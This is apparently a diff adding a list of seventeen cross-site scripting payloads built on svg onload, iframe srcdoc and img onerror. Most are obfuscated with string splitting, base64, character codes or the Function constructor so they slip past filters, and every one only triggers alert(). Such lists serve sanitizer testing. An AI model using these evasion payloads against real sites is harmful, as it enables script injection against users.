@@ -1,0 +1,17 @@
+<svg onload='((()=>{})["constructor"]("al"+"ert(2)")())'></svg>
+<iframe srcdoc="<script>alert('XSS')</script>"></iframe>
+<iframe srcdoc="<img src='x' onerror=eval(atob('YWxlcnQoNik='))>"></iframe>
+<iframe srcdoc="<svg onload=(function(){window['ale'+'rt'](7)})()>"></iframe>
+<svg onload='window.setTimeout(String.fromCharCode(97,108,101,114,116,40,56,41),0)'></svg>
+<svg onload='Function(&#39;al&#39;+&#39;ert(11)&#39;)()'></svg>
+<iframe srcdoc="<img src='x' onerror=window['al'+'ert'](12)>"></iframe>
+<iframe srcdoc="<svg onload=window['ale'+'rt'](14)>"></iframe>
+<svg onload='setTimeout(Function(&#96;al&#101;rt(16)&#96;),0)'></svg>
+<svg onload='window["al"+"ert"](18)'></svg>
+<iframe srcdoc="<svg onload=Function('al'+'ert(19)')()>"></iframe>
+<svg onload='(new Function("al"+"ert(21)"))()'></svg>
+<iframe srcdoc="<img src='x' onerror=eval('window.ale'+'rt(22)')>"></iframe>
+<svg onload='setTimeout(function(){eval("al"+"ert(23)")},0)'></svg>
+<iframe srcdoc="<script>eval(`al`+`ert(24)`)</script>"></iframe>
+<svg onload='((function(){})["constructor"]("al"+"ert(25)")())'></svg>
+<svg onload='Function("al"+"ert(27)")()'></svg>
